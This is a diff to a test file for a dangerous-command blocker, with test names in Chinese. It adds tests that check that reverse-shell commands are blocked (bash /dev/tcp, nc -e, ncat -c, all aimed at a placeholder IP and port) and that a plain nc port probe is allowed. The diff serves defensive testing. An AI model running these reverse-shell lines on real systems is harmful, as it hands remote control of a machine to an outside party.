@@ -54,6 +54,27 @@ describe('block-dangerous-commands', () => {
     expect(r.blocked).toBe(true);
   });
 
+  // 反弹 shell
+  it('应该阻止 /dev/tcp 反弹 shell', () => {
+    const r = checkCommand('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1');
+    expect(r.blocked).toBe(true);
+  });
+
+  it('应该阻止 nc -e 反弹 shell', () => {
+    const r = checkCommand('nc -e /bin/sh 1.2.3.4 4444');
+    expect(r.blocked).toBe(true);
+  });
+
+  it('应该阻止 ncat -c 反弹 shell', () => {
+    const r = checkCommand('ncat -c bash 1.2.3.4 4444');
+    expect(r.blocked).toBe(true);
+  });
+
+  it('应该允许 nc 端口探测（防误报）', () => {
+    const r = checkCommand('nc -zv example.com 80');
+    expect(r.blocked).toBe(false);
+  });
+
   it('应该允许 git push --force-with-lease feat 分支', () => {
     const r = checkCommand('git push --force-with-lease origin feat/test');
     expect(r.blocked).toBe(false);
